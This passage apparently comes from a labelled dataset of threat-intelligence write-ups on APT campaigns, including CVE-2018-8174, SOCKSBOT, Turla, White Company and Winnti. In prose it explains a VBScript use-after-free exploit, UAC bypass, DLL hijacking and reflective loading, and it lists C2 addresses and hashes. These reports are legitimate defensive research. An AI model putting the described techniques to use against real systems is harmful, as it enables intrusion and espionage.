        "explain": "Recently, the Advanced Threat Response Team of 360 Core Security Division detected an APT attack exploiting a 0-day vulnerability and captured the world’s first malicious sample that uses a browser 0-day vulnerability. We code named the vulnerability as “double kill” exploit. This vulnerability affects the latest version of Internet Explorer and applications that use the IE kernel. When users browse the web or open Office documents, they are likely to be potential targets. Eventually the hackers will implant backdoor Trojan to completely control the computer. In response, we shared with Microsoft the relevant details of the 0day vulnerability in a timely manner. This APT attack was analyzed and attributed upon the detection and we now confirmed its association with the APT-C-06 Group. On April 18, 2018, as soon as 360 Core Security detected the malicious activity, we contacted Microsoft without any delay and submitted relevant details to Microsoft. Microsoft confirmed this vulnerability on the morning of April 20th and released an official security patch on May 8th. Microsoft has fixed the vulnerability and named it CVE-2018-8174. After the vulnerability was properly resolved, we published this report on May 9th, along with further technical disclosure of the attack and the 0day. According to the sample data analysis, the attack affected regions in China are mainly distributed in provinces that actively involved in foreign trade activities.Victims include trade agencies and related organizations. The lure documents captured in this attack are in Hebrew[1] The attackers exploit office with OLE autolink objects (CVE-2017-0199) to embed the documents onto malicious websites. All the exploits and malicious payload were uploaded through remote servers.Links to this document may reference other files. Do you want to update this document with the data in the linked file? Once victims opened the lure document, Word will firstly visit a remote website of IE vbscript 0day (CVE-2018-8174) to trigger the exploit. Afterwards, Shellcode will be running to send several requests to get payload from remote servers. The payload will then be decrypted for further attack.While the payload is running, Word will release three DLL backdoors locally. The backdoors will be installed and executed through PowerShell and rundll32. UAC bypass was used in this process, as well as file steganography and memory reflection uploading, in order to bypass traffic detection and to complete loading without any files.On April 18, 2018, Advanced Threat Response Team of 360 Core Security Division detected a high-risk 0day vulnerabilities. The vulnerability affects the latest version of Internet Explorer and applications that use the IE kernel and has been found to be used for targeted APT attacks. On the same day, 360 immediately communicated with Microsoft and submitted details of the vulnerability to Microsoft. Microsoft confirmed this vulnerability on the morning of April 20th and released an official security patch on May 8th. The 0day vulnerability was fixed and it was named CVE-2018-8174. CVE-2018-8174 is a remote code execution vulnerability of Windows VBScript engine. Attackers can embed malicious VBScript to Office document or website and then obtain the credential of the current user, whenever the user clicks, to execute arbitrary code.Through the statistical analysis of the vulnerability samples, we found out that obfuscation was used massively. Therefore, we filtered out all the duplicated obfuscation and renamed all the identifiers. Seeing from the POC created by using the exploit samples we captured, the principles of the exploit is obvious. The POC samples are as below: 1) First create a cla1 instance assigned to b, and then assign value 0 to b, because at this point b’s referenced count is 1, causing cla1’s Class_Terminate function to be called. 2) In the Class_Terminate function, again assign b to c and assign 0 to b to balance the reference count. 3) After the Class_Terminate return, the memory pointed to by the b object will be released, so that a pointer to the memory data of the released object b is obtained. 4) If you use another object to occupy the freed memory, it will lead to the typical UAF or Type Confusion problem.The 0-day exploit exploits UAF multiple times to accomplish type confusion. It fakes and overrides the array object to perform arbitrary address reading and writing. In the end, it releases code to execute after constructing an object. Code execution does not use the traditional ROP or GodMod, but through the script layout Shellcode to stabilize the use. Mem members of 2 classes created by UAF are offset by 0x0c bytes, and an array of 0x7fffffff size is forged by reading and writing operation to the two mem members.A forged array composes of a one-dimensional array, the number of elements is 7fffffff, each element occupies 1 byte, and the element memory address is 0. So the accessible memory space for the array is from 0x00000000 to 0x7ffffffff*1. Therefore, the array can be read and written at any address. But the storage type of lIlIIl is string, so only by modifying the data type to 0x200C, i.e. VT_VARIANT|VT_ARRAY( array type), attackers can achieve their purpose.In the malicious code, the above function is mainly used to read the data of the memory address specified by the parameter. The idea is to obtain the specified memory read capability via the characteristics of the first 4 bytes of the string address (namely, the content of the bstr, type, size field) returned by the lenb (bstr xx) in the vb (the data type in the VBS is bstr). This is shown in the above code. If the input argument is addr(0x11223344), first add 4 to the value to get 0x11223348, and then set the variant type to 8 (string type). Next, call len function: if found to be BSTR type, vbscript will assume that the forward 4 bytes (0x11223344) is the address memory to store the length. So the len function will be executed and the value of the specified memory address will be returned.We found that this code was modified from invoke-ReflectivePEInjection.ps1[2]. buffer_x86 and buffer_x64 in the code are same function but from different versions of dll files. File export module name: ReverseMet.dll.DLL file decrypts ip address, port and sleep time from the configuration. After the decryption algorithm xor 0xA4, and subtracted 0x34, the code is as follows.Decryption configuration file from the ip address 185.183.97.28 port 1021 to obtain the next load and execute. After it connects to the tcp port, it will get 4 bytes to apply for a memory. Subsequent acquired writes into the new thread, and execute the acquired shellcode payload.In addition to use PowerShell to load the payload, the bait DOC file also runs rundll32.exe to execute another backdoor locally. There are several notable features of the backdoor program it uses: the program uses COM port to copy files, realize UAC bypass and two system DLL hijacks; it also uses the default DLLs of cliconfg.exe and SearchProtocolHost.exe to take advantage of whitelist; finally in the process of component delivery, use file steganography and memory reflection loading method to avoid traffic monitoring and achieve no file landing load.The backdoor program used in this attack is actually the Retro series backdoor known to be used by the APT-C-06 organization. The following is a detailed analysis of the implementation process of the backdoor program. First execute the DLL disguised as a zlib library function with rundll32 and execute the backdoor installation functions uncompress2 and uncompress3. It uses a COM port for UAC bypass, copying its own DLL to the System32 path for DLL hijacking, and the hijacked targets are cliconfg.exe and SearchProtocolHost.exe. Copy the DLL file in the AppData directory to the System32 directory through the COM interface and name it msfte.dll and NTWDBLIB.dll.Then copy the file NTWDBLIB.dll to the System directory and execute the system’s own cliconfig to achieve DLL hijacking and load NTWDBLIB.dll.The role of NTWDBLIB.dll is to restart the system service WSearch, and then start msfte.dll.The script will then generate and execute the MO4TH2H0.bat file in the TEMP directory, which will delete the NTWDBLIB.DLL and its own BAT from the system directory.Msfte.dll is the final backdoor program whose export is disguised as zlib. The core export functions are AccessDebugTracer and AccessRetailTracer. Its main function is to communicate with CC and further download and execute subsequent DLL programs.Similar to the previously analyzed sample, it is also using image steganography and memory reflection loading. The decrypted CC communication information is as follows: Among them, the parameter p is the current process authority, there are two types of M and H, inst parameter is the current installation id, name is the CC_name obtained by decryption, this time is pphp. After decryption after downloading, the process is exactly the same as the format of the previous image steganography transmission. The decryption process this time is shown in the figure below:For the CC URL corresponding to the test request, because we did not obtain the corresponding image during the analysis, the CC is suspected to have failed. In the implementation process, Retro disguised fake SSH and fake zlib, intended to obfuscate and interfere with users and analysts. Retro’s attack method has been used since 2016.The back door program used in the APT-C-06 organization’s early APT operation was Lucker. It is a set of self-developed and customized modular Trojans. The set of Trojans is powerful, with keyboard recording, voice recording, screen capture, file capture and U disk operation functions, etc. The Lucker ‘s name comes from the PDB path of this type of Trojan, because most of the backdoor’s function use the LK abbreviation.In the middle to late period we have discovered its evolution and two different types of backdoor programs. We have named them Retro and Collector by the PDB path extracted from the program. The Retro backdoor is an evolution of the Lucker backdoor and it actives in a series of attacks from 2016 till now. The name comes from the pdb path of this type of Trojan with the label Retro, and also has the word Retro in the initial installer.The evolution of the reflective DLL injection technique can be found from the relevant PDB paths, and there are a lot of variants of this series of backdoors.During the analysis, we found the decryption algorithm that malware used is identical to APT-C-06’s decryption algorithm. The decryption algorithm of this attack is as follow:In the further analysis, we found the same decryption algorithm was used in the 64-bit version of the relevant malware. The PDB path of the malware used in this attack has a string of “Retro”. It is one specific feature of Retro Trojan family.In the process of tracing victims, we found one special compromised machine. It has a large amount of malware related to APT-C-06. By looking at these samples in chronological order, the evolution of the malicious program can be clearly seen. The victim has been under constant attack acted by APT-C-06 since 2015. The early samples on the compromised machine could be associated with DarkHotel. Then it was attacked by Lurker Trojan. Recently it was under the attack exploiting 0-day vulnerabilities CVE-2018-8174. APT-C-06 is an overseas APT organization which has been active for a long time. Its main targets are China and some other countries. Its main purpose is to steal sensitive data and conduct cyber-espionage. DarkHotel can be regarded as one of its series of attack activities. The attacks against China specifically targeted government, scientific research institutions and some particular field. The attacks can be dated back to 2007 and are still very active. Based on the evidence we have, the organization may be a hacker group or intelligence agency supported by a foreign government. The attacks against China have never stopped over the past 10 years. The Techniques the group uses keep evolving through time. Based on the data we captured in 2017, targets in China are trade related institutions and concentrated in provinces that have frequent trading activities. The group has been conducting long-term monitoring on the targets to stole confidential data. During the decades of cyber attacks, APT-C-06 exploits several 0-day vulnerabilities and used complicated malware. It has dozens of function modules and over 200 malicious codes. In April, 2018, the Advanced Threat Response Team of 360 Core Security Division takes the lead in capturing the group’s new APT attack using 0-day vulnerabilities (CVE-2018-8174) in the wild, and then discovers the new type attack – Office related attack exploiting 0-day VBScript vulnerabilities. After the capture of the new activity, we contacted Microsoft immediately and shared detailed information with them. Microsoft’s official security patch was released on 8th May. Now, we published this detailed report to disclose and analyze the attack.360 Helios Team is the APT(Advanced Persistent Attack) research and analysis team in Qihoo 360. The team is dedicated in APT attack investigation, threat incident response and underground economy industrial chain studies. Since the establishment in December, 2014, the team has successflly integrated 360’s big data base and built up a quick reversing and corellation procudure. So far, more than 30 APT and underground economy groups have been discovered and revealed. 360 Helios also provides threat intelligence assessment and response solutions for enterprises.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "A number of security vendors reported a series of cyber-attacks involving the use of a malware family called SOCKSBOT and claimed to be associated with CANDLEFISH (a.k.a. Patchwork, Dropping Elephant). However, as disclosed in this report, research by iDefense analysts shows that SOCKSBOT was in fact used by a threat group in an 18- month-long campaign dubbed Goldfin, spoofing financial institutions in the Commonwealth of Independent States (CIS) countries since as early as February 2017 to as recently as May 2018. Based on the tactics, techniques and procedures (TTPs) observed in this campaign, iDefense assesses with moderate confidence that the reported campaign is unlikely to be associated with CANDLEFISH. In addition, iDefense analysts have identified infrastructure overlap and the shared use of a PowerShell obfuscation technique with FIN7. Although these observations are not enough to attribute the Goldfin campaign to FIN7, iDefense assesses these to be interesting and noteworthy observations that further highlights the complex relationships that exist behind-the-scene in organized cyber crime.iDefense is providing information about the reported campaigns to the general iDefense customer base, with this report being intended for security operations center (SOC) analysts and engineers. Management and executive leadership may also want to use this information.iDefense is providing this information so that customers are aware of the modus operandi of a highly active threat group that is targeting financial institutions for financial gain. SOC analysts and engineers can use this IA's detailed information pertaining to the workings of a malware family and indicators of compromise (IoCs) to contain or mitigate the discussed threat through monitoring or blocking. SOC analysts can use the information provided in the Analysis and Mitigation sections of this IA for hunting activities for systems that may have already been compromised. Analysts and security engineers can use the IoCs by adding them to hunting lists on endpoint detection and response (EDR) solutions as well as network- and host-based blacklists to detect and deny malware implantation and command-and-control (C2) communication. Intelligence analysts may want to use the information provided in this IA to better inform their own analyses. The provided information can also help inform ongoing intelligence .analyses and forensic investigations, particularly for compromise discovery, damage assessment, and attribution. Management and executive leadership may use this information to assess the risks associated with the threat described herein to make operational and policy decisions accordingly.iDefense analysts came across two spear-phishing campaigns in October 2017 involving the use of a malware family publicly known as SOCKSBOT. One campaign spoofs the Halyk Bank (Exhibit 1) and another spoofs the PrivatBank (Exhibit 2): As Exhibits 1 and 2 show, both emails contain an identical message, even down to the location of the embedded hyperlinks. The only differences are the embedded URLs and the signature of the email in order to reflect the financial institution the attackers were spoofing. This information suggests some sort of phishing kit was likely used to generate the phishing emails. An approximate translation of the e-mail spoofing Halyk Bank is as follows:Subsequent technical analysis of the infection chain involved led iDefense to uncover an 18-month long campaign of spoofing banks in CIS countries, with the most recent campaign observed on May 28, 2018 spoofing the Idea Bank CJSC：The forum member reports that two spear-phishing emails were received: one claiming to be a notification about opening an account and the other claiming to be a notification of a loan being taken out. The content of the latter email is approximately translated below:In the attacks observed, all involved a phishing email with two embedded URLs directing the user to download a file named dog.zip. Based on the content of the e-mails and the domain names, the following banks were spoofed in this campaign: It is also noteworthy that in both phishing kits, there are always two hyperlinks linking to the same malicious file: one in the body of the message and one at the end of the e-mail in a link called Договор (which translates to Contract). The next section details the infection chain that follows the initial download.Unsurprisingly, this script also contains obfuscated code. The malicious payload is compressed, Base64 encoded, and embedded within the script, which is similar to a technique used in PowerSploit. However, the observed technique appears to be a variant of PowerSploit as the encoded payload is further split into a number of chunks that are dynamically loaded into an array variable named $OArr as shown in Exhibit 8:As mentioned in the last section, the SOCKSBOT implant is typically delivered as a Base64-encoded string reflectively loaded (via the ?ReflectiveLoader@@YGKPAX@Z exported function) in a newly started svchost.exe process. As such, the implant exists only in memory and never touches the disk. The implant will first verify if any of the mutexes in the following format are present in order to not run twice: Global\\%snps Global\\%sstp Exhibit 10 shows an example of a created mutex.This implant will communicate with the designated C2 server by first creating a buffer and will, on first execution, communicate to the C2 server that it has successfully infected a target by using a.php URI that is pseudo-randomly generated. SOCKSBOT uses the ObtainUserAgentString API to determine the default user-agent of the machine. An example of a request to the C2 46.166.163[.]243 is shown in Exhibit 11.The C2 server or the operator of the SOCKSBOT implant can then respond with a specific HTTP status code to perform a set of actions. Exhibit 12 shows this option in the implant.SOCKSBOT can thus write other PowerShell scripts to the %TEMP% folder and execute these hidden from the user. This is achieved with the following command.This allows the attacker to upload other obfuscated PowerShell scripts on the machine and, as such, makes SOCKSBOT a powerful and persistent backdoor. Altogether, the SOCKSBOT samples observed and analyzed in this report are as follows:While the described infection chain above is the most common infection chain observed, iDefense analysts have also observed a number of different variations in related campaigns:Aside from the PowerShell reflective loader, iDefense analysts have also identified a dropper executable binary with the following properties that was used to reflectively load SOCKSBOT into a chosen process (usually svchost.exe):Note that the binary was signed with a code-signing certificate purportedly from an organization called Magnum Travel Club. This dropper will create a copy of itself in C:\\Programdata\\Logs as a hidden system file and will then delete the original file. Another copy will be created in %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup with the same properties to ensure persistence. Finally, the dropper will start a new svchost.exe process in a suspended state and consequently reflectively load (and inject) the SOCKSBOT implant into the process. An additional Windows service may be created for persistence as well, which is done by first enumerating existing legitimate services and creating a new service spoofing one of the services with an almost identical name. In this case, a new service named Xindows Error Reporting Service was created (see Exhibit 14).While this dropper does indeed load the SOCKSBOT implant, all other iterations or campaigns have used scripts, in particular JavaScript and PowerShell, to reflectively load the SOCKSBOT payload.While most dog.js samples observed were obfuscated as reported in the infection chain section, there are also versions that were not obfuscated at all or were obfuscated using a different obfuscation technique such as different character encoding (Exhibit 15): Aside from changes to the dog.js obfuscation, iDefense analysts have also found a different obfuscation technique used to obscure the code in the reflective loading script (see Exhibit 16): The sample concerned has the MD5 signature c38b06f871d2268972fa01725b59d7ed. Note also that the execution command used for persistence is again encoded (see Exhibit 17):Based on the preference to spoof financial institutions in CIS countries, the network infrastructure used and the observed targeting, iDefense assesses with moderate confidence that the reported campaign is unlikely to be associated with CANDLEFISH. Furthermore, iDefense analysts have identified a number of interesting and noteworthy overlaps with FIN7: Research shows that the domains privat-bankau[.]com, halyk-bank[.]com, and tejara-bank[.]com all have the organization name Goldfin LLC, a near-identical registrant address (see below), and a @rambler.ru e-mail address used as the registrant e-mail address.This pattern overlaps with two other domains - despanabrandfood[.]com and silverdiners[.]com (see Exhibit 18) - that iDefense current assesses with low confidence are likely associated with FIN7 due to the following:As mentioned in the infection chain analysis, the code embedded within the third-stage PowerShell script checkupdate.ps1 is obfuscated using a technique similar to that of PowerSploit. However, the technique used appears to be a niche variant as the embedded payload is further split into chunks and dynamically added to an array variable named $OArr. Interestingly, iDefense analysts have previously observed this obfuscation used in a PowerShell component (MD5: 87327b4045b9d004697aec7e7a4b9ba8) that was dropped by a HALFBAKED sample (MD5: 31fcf8a4ec7a4c693eda9336321cf401) back in August 2017. HALFBAKED is a malware family associated with FIN7.While the above overlapping features are not strong enough to be used to conclude that the Goldfin campaign is associated with FIN7, iDefense analysts believe they are significant and noteworthy and may well add to new evidence that may come to light in the future as research continues. They also highlight the complex hidden relationships that exist behind-the-scenes in organized cyber crime.\n\n\n",

        "label": "true",
        "explain": "Regarded as a highly sophisticated advanced persistent threat (APT) group, the Russian-based Turla has been suspected to be operational since at least 2004. Turla’s group names are infamously titled after its top-class rootkits such as Snake, Venomous Bear, WhiteBear, Uroburos, Group 88, and Waterbug, all known for targeting government entities, intelligence agencies, as well as the military, educational, research, and pharmaceutical industries around the world. Like other APT groups, Turla possesses its own specifically-designed, complex tools. However, it is the threat actor’s satellite-based command-and-control (C&C) mechanism that it uses in the latter stages of an attack, coupled with its ability to fly under the radar, that makes Turla stand out from its contemporaries.Although Turla has been known to be active in the wild for several years now, its infection vector had been a question mark. Research conducted in 2014 indicated a sophisticated multi-stage attack using Epic (a malware family used by Turla), with the campaign being dubbed as Epic Turla. The attacks, which exploited the vulnerabilities CVE-2013-5065 and CVE-2013-3346, employed spear-phishing emails that used Adobe PDF exploits and watering-hole techniques that used Java exploits (CVE-2012-1723) The major highlight of this campaign was Turla’s use of more complex backdoors like Carbon/Cobra, with the group sometimes using both backdoors as a failover.Tactics and Techniques:TA0001 (Initial Access),T1189 (Drive-by Compromise),T1566 (Phishing),TA0002 (Execution),T1204.002 (User Execution: Malicious File),While the previous Turla campaigns were designed to target Windows-based machines, the campaign in August 2014 was the first instance where Turla targeted the Linux operating system. Dubbed as Penguin Turla, the group used a Linux Turla module with a C/C++ executable statically linked against multiple libraries, greatly increasing its file size for this campaign.A group of threat actors named Waterbug (alleged to be a state-sponsored group) used variants of Trojan.Turla and Trojan.Wipbot to exploit a zero-day vulnerability, specifically the Windows Kernel NDProxy.sys local privilege escalation vulnerability CVE-2013-5065. A research entry suggested that the attackers used specially crafted emails with malicious attachments and a set of compromised websites to deliver malicious payloads.In 2017, ESET published a research entry on a sophisticated variant of the Turla malware, a second-stage backdoor known as Carbon. A Carbon attack initially involves the victim either receiving a spear-phishing email or visiting a compromised website, also known as a watering hole. This is then followed by the installation of a first-stage backdoor such as Tavdig or Skipper. The second-stage backdoor Carbon is then installed on key systems after renaissance activities are completed. The Carbon framework consists of a dropper to install its configuration file, a component to communicate with the C&C server, an orchestrator to handle tasks and move them laterally over the network, and a loader to execute the orchestrator.In May 2017, a new backdoor trojan by the name Kazuar was linked to the Turla group. Written using the Microsoft .NET Framework, Kazuar contains highly functional command sets that are capable of remotely loading additional plug-ins. Kazuar gathers system and malware file name information and creates a mutex to ensure that only one instance of the malware executes on the system at a time. It then adds an LNK file to the Windows startup folder. Majority of the commands set in Kazuar share similar attributes with other backdoor Trojans. For example, the tasklist command uses a Windows Management Instrumentation (WMI) query to obtain running process from Windows while the info command is used to gather information about opened windows. Meanwhile, Kazuar’s cmd command will run commands using cmd.exe for Windows systems and /bin/bash for Unix systems. These commands strongly suggests that Kazuar was built to be a cross-platform malware targeting both Windows and Unix systems.Research conducted in early 2021 revealed several similarities between the Sunburst and Kazuar backdoors. In August, Turla unveiled a new second-stage backdoor written in C++ known as Gazer, which relied on watering-hole attacks and spear-phishing campaigns for more precise targeting of victims. Aside from being stealthier, Gazer was found to have plenty of similarities with the previously used second-stage backdoors such as Carbon and Kazuar. The defining characteristic of this campaign was the insertion of “video-game-relate” sentences throughout the code. Turla encrypts Gazer’s C&C server using its own library for 3DES and RSA.An intelligence report from 2018 suggested that Turla used new malicious tools known as Neuron and Nautilus in conjunction with the Snake rootkit to target Windows machines, focusing on mail and web servers in particular. Turla made use of existing Snake victims to scan for ASPX shell, with the commands being passed using encrypted HTTP cookie values. The entry also mentioned that Turla used ASPX shells to gain a foothold into the target system to deploy additional tools.Turla targeted the foreign offices of European governments via a backdoor, with the intention of accessing highly sensitive information. The campaign targeted Microsoft Outlook and The Bat! (a popular mail client primarily used in Eastern Europe) by forwarding all outgoing emails to the attackers. The backdoor used email messages to exfiltrate data, employing specially crafted PDF documents. It also used email messages as a transport layer for its C&C server.OilRig is an Iran-linked APT group that usually targets government agencies and organizations in the Middle East. Previous research suggests that the Turla group compromised a target using OilRig’s infrastructure. The campaign saw the use of a heavily modified, custom variant of the Mimikatz tool, plus a new set of tools involving several new backdoors. In the later stages of the campaign, Turla group used a different remote procedure call (RPC) backdoor, which included code from the publicly available PowerShell Runner tool to execute PowerShell scripts (without using powershell.exe).In March 2020, security researchers observed Turla targeted multiple Armenian websites using watering-hole attacks. These websites were implanted with malicious JavaScript code, although the access methods used in attack are unknown. The compromised webpage then delivered the second-stage malicious JavaScript code to fingerprint victim browser and trick them into installing a malicious flash installer. Turla then used NetFlash (a .NET downloader) and PyFlash for its second-stage malware. T1041 (Exfiltration Over C2 Channel)ComRAT v4, also known as Agent.BTZ, is a remote access trojan (RAT) used by Turla and developed using C++ and employing a virtual FAT16 file system that is often used to exfiltrate sensitive documents. It is deployed using existing access methods, such as the PowerStallion PowerShell backdoor. Furthermore, it uses HTTP and emails as C&C channels. In December 2020, a previously undocumented backdoor and document stealer named Crutch was attributed to the Turla group. Apparently, older versions of Crutch included a backdoor that communicated with a hard-coded Dropbox account using the official HTTP API. It had the ability to execute commands related to the reading and writing of files, executing additional processes, and setting persistence via DLL hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive. One major feature of Crutch v4 is that it can automatically upload the files found on local and removable drives to Dropbox storage by using the Windows version of the Wget utility (unlike the previous versions that relied on the backdoor commands).The new Turla backdoor known as TinyTurla was likely used as a failover option to maintain access to the system even when the primary malware is removed. The backdoor is installed using a batch file and comes in the form of a service DLL called w64time.dll that tries to impersonate the legitimate w32time.dll file on Windows systems.Turla’s May 2022 campaign was used for the sole purpose of reconnaissance and did not involve any use of malicious code. Security researchers discovered a document that performed requests via HTTP to its own controlled server, with the purpose of capturing the version and type of Microsoft Word application used by the victim. The information can later be used to craft a specific exploit based on the Microsoft Word version.A July 2023 announcement from the Computer Emergency Response Team of Ukraine (CERT-UA) revealed that Turla was using the Capibar malware and Kazuar backdoor for espionage attacks on Ukrainian defensive assets. In this campaign, Capibar was used for intelligence gathering while Kazuar performed credential theft. This attack targeted diplomatic and military organizations by leveraging phishing attacks. The Turla group is a persistent adversary with a long history of activities. Their origins, tactics, and targets all indicate a well-funded operation with highly skilled operatives. Turla has continuously developed its tools and techniques over years and will likely keep on refining them.The threat posed by groups such as Turla underscores the importance for organizations and governments to remain vigilant by staying informed, sharing intelligence, and implementing security measures that can allow both groups and individuals to better protect themselves against these kinds of threat actors.\n\n\n",

It is believed the group was also responsible for a much - documented 2008 attack on the US Central Command.

        "explain": "An UNC group is a cluster of cyber intrusion activity—which includes observable artifacts such as adversary infrastructure, tools, and tradecraft—that we are not yet ready to give a classification such as APT or FIN. UNCs are created based on a defining, anchoring characteristic often discovered during a single incident. As we discover new artifacts associated with other incidents and proactive collections efforts, the UNC provides a framework to join discrete pieces of evidence together. These clusters can grow, merge with, or break off from other clusters, potentially become combined under a TEMP name, such as TEMP.Warlock, and/or 'graduate' into fully defined groups, such as FIN11, as depicted in Figure 1. In exposing UNC groups in Mandiant Advantage, we are providing a way for users to track the groups that might become APT and FIN groups before they 'graduate' into fully defined threat groups and are announced publicly.It is important to note that UNCs can undergo significant changes over time based on our evolving understanding of old and new evidence. UNC churn can get messy, that’s why we consider UNCs to reflect raw to maturing stages in the attribution process. The road from an initial UNC to an APT or a FIN group typically takes years of painstaking collections, research, and analysis; thousands of pieces of evidence; hundreds of hours of work. But it is worth it! We strongly believe that attribution analysis, as it grows and matures, generates compounding returns for network defenders, equipping them to classify and prioritize response and remediation efforts, as well as predict and prevent some attacks, see Table 1. Even at early phases, UNCs can provide powerful intelligence value.We first discussed UNC1878 publicly in March 2020, describing how an initial TrickBot compromise fairly quickly led to the installation of an interactive backdoor and lateral movement. This incident was detected and contained before additional attacker actions were observed, but nonetheless, it fueled additional research and allowed us to link a later compromise where RYUK ransomware was deployed to the original activity set. At that time, the intelligence value was underscoring that widely distributed malware such as TrickBot can be a precursor to a ransomware infection, and the remarkable speed with which UNC1878 in particular progressed from initial foothold to lateral movement—important operational and strategic insights for alert prioritization and risk assessment. By late October 2020, further research into this activity set uncovered additional malware families and infrastructure as well as a much more robust understanding of the group’s most common tactics, techniques, and procedures (TTPs), including how these have both evolved over time. We were also able to identify targeting victimology patterns that allowed us to issue a warning: despite a global pandemic, UNC1878 is actively targeting healthcare facilities with ransomware.UNC1945 represents a case in which we have not yet determined the goal of the attacker, nor information about its potential origin, but the tactics of this activity cluster are significant enough that it is worth calling attention to it. For example, Mandiant discovered UNC1945 exploiting a zero-day vulnerability in the Oracle Solaris Pluggable Authentication Module (PAM), CVE-2020-14871. We reported the vulnerability to the vendor, who recently released a patch. We observed this actor exploit various operating systems and demonstrate access to resources and numerous toolsets as well as traverse multiple third-party networks, suggesting a sophisticated and persistent adversary. We noted that UNC1945 appeared to be targeting specific financial and consulting organizations via third party compromise. These assessments allow clients to gauge potential strategic risk to their organization based on observed targeting patterns, review tactical strategies for countering third party compromise vectors, as well as download indicators and signatures to take operational defensive steps against this threat.UNC groups support Mandiant incident responders, researchers, and analysts to track malicious activity and turn observations into action to empower defenders. They also represent one way in which Mandiant Advantage is equipping clients to use source materials and raw analysis to improve tradecraft, and hopefully, defensive outcomes in their own environments. Moreover, UNC groups empower users to track activity sets that will become APT and FIN groups before they 'graduate' into fully defined threat groups and are announced publicly—in some cases, years before.\n\n\n",

        "explain": "The campaign is the work of a previously unknown APT group called The White Company. Experts believe The White Company is likely a state-sponsored group and has access to zero-day exploits. The Pakistani military has fallen victim to a year-long cyberespionage campaign that experts believe is still ongoing. The campaign, dubbed Operation Shaheen, is believed to be the work of a previously unknown APT group called The White Company. Experts believe The White Company is likely a state-sponsored group and has access to zero-day exploits. According to security researchers at Cylance, who tracked Operation Shaheen, White Company targeted officers in the Pakistani Air Force with a phishing attack that distributed remote access trojans (RATs) and other malware payloads. What is more, researchers said that they found no errors committed by the group that may have revealed its members’ true identity. This indicates that the threat group is highly sophisticated and careful to ensure that it leaves to traces of its identity. “We have observed The White Company evolve, modify, and refine both its exploits and its malware. They craft advanced tools that are mission-specific and tailored to esoteric target environments,” Cylance researchers said in a report. “We’ve witnessed The White Company go to unusual lengths to ensure stealth. In this campaign, we watched them turn eight different antivirus products against their owners.” It is still unclear whether the targets fell for the phishing lures and whether The White Company was capable of successfully infiltrating systems and exfiltrating sensitive data. “We call this threat actor The White Company in acknowledgment of the many elaborate measures they take to whitewash all signs of their activity and evade attribution,” Cylance researchers added. “Perhaps the most significant of contradictions exposed by Cylance’s research is that the threat of state-sponsored cyber espionage has already arrived on Pakistan’s doorstep—a reality which appears to have just dawned on the Pakistanis themselves, at least in public discourse.”\n\n\n",

Innovative Research Methodologies Employed The White Company project benefitted from an innovative, new approach to analyzing a large portion of a threat actor’s exploit kit, which in this case involved a painstaking examination of the machine-language shellcode instructions embedded within a sample of roughly 30 exploits. Other methods we uncovered include: Within the exploit: four different ways to check whether the malware was on an analyst’s or investigator’s system; the capacity to clean up Word and launch a decoy document to reduce suspicion; and the ability to delete itself entirely from target system Within the malware: five different obfuscation (packing) techniques that placed the ultimate payload within a series of nesting-doll layers; additional ways to check whether the malware was on an analyst’s or investigator’s system; anonymous, open-source payloads and obfuscation techniques; the use of compromised or otherwise un-attributable network infrastructure for command and control An all-encompassing breakdown of the malware and infrastructure used illuminates a disturbing trend in threat actor behavior, where publicly available tools and techniques are employed by a sophisticated, well-resourced actor, almost surely for the purpose of removing identifiable fingerprints and avoiding the detection of custom malware early on in the campaign. Our comprehensive approach to examining The White Company and one of their campaigns has shown that this threat actor has a keen awareness of the typical methods, biases, and assumptions held by many in the security research and investigative communities - and they have demonstrated an ability to use that common approach against that community by deliberately undermining those assumptions and leaving contradictory bits of evidence that effectively distract, delay and degrade the ability to analyze their work. The White Company project consists of three chapters within a single report, applying a new, comprehensive approach to threat intelligence research to unlock insights into this threat actor and its operations, and which combines detailed technical research with accessible storytelling. We uncovered evidence that establishes that the White Company possesses the following: ◦ access to zero-day exploit developers and, potentially, zero-day exploits ◦ a complex, automated exploit build system ◦ the ability to modify, refine and evolve exploits to meet mission-specific needs ◦ the capacity for advanced reconnaissance of targets The White Company is the first threat actor Cylance has encountered that targets and effectively evades no less than eight different antivirus products – Sophos, ESET, Kaspersky, BitDefender, Avira, Avast!, AVG, and Quick Heal – before turning them against their owners by deliberately surrendering to them on specific dates in order to distract, delay, and divert the targets’ resources.",

        "claim": "China's Winnti APT Compromises National Grid in Asia for 6 Months.",
        "original_label": "true",
        "label": "true",
        "explain": "A Chinese threat actor managed to breach the national power grid in an unnamed Asian country earlier this year, compromising multiple computers and using a popular remote access Trojan (RAT) to steal sensitive data. The perpetrator — an entity within Winnti Group, also known as APT41, Bronze Atlas — has a history of taking on some of the most high-level cyber espionage conducted by the People's Republic of China (PRC), including campaigns against hostile governments and industries abroad. Its wide-ranging and successful campaigns have earned it attention from international law enforcement to a degree matched only by the world's most prolific nation-state and cybercriminal groups. In this latest campaign, a subsect within Winnti known as “Redfly” or “Red Echo” managed to occupy the network of an Asian national electricity provider for half a year, deploying a Trojan called “ShadowPad” to harvest credentials and obtain privileged information. According to Dick O'Brien, principal intelligence analyst for the Symantec threat hunter team, this latest case of critical infrastructure attack signals a worrying trend for the sector on the whole. “I think it can be very easy to hear the warnings but not to do anything until something really bad happens,” he warns. “The worst case scenario is quite rare, but it does happen from time to time.” Researchers from Symantec traced the campaign back to Feb. 28 when ShadowPad was deployed in a single computer in the target network. ShadowPad, first discovered eight years ago, is a modular backdoor in shellcode format. Like its successor — the long-running PlugX family of Trojans — it was at one point briefly shared with select buyers in the cyber underground, but is generally seen in correlation with Chinese state-sponsored attacks. In this campaign, the attackers used a distinct variant of ShadowPad which copies itself to disk, disguised as VMWare files and directories. Redfly deployed ShadowPad for a second time in the target network on May 17, indicating that it had maintained persistence in the three months interim. In the following days and weeks, Redfly began to flex its muscle. On May 19, for instance, it performed DLL sideloading to drop a payload, then used Powershell to get information about storage devices attached to the system. On May 26, it dumped credentials from the %TEMP% registry and cleared Windows security event logs. By May 31, it'd used its stolen credentials to spread its malware to further machines in the network. On July 27, Redfly dropped a keylogger, stored under various file names on various computers. And on its final day of malicious activity, Aug. 3, Redfly attempted to dump credentials from the Windows registry.An attack against a national grid just doesn't pack the same punch today as it would've years ago. While Winnti was running through this Asian grid provider in May, Microsoft revealed that a different Chinese APT, Volt Typhoon, had compromised US critical infrastructure organizations, an attack which somehow later turned out to be even worse than initially thought. That campaign inspired a 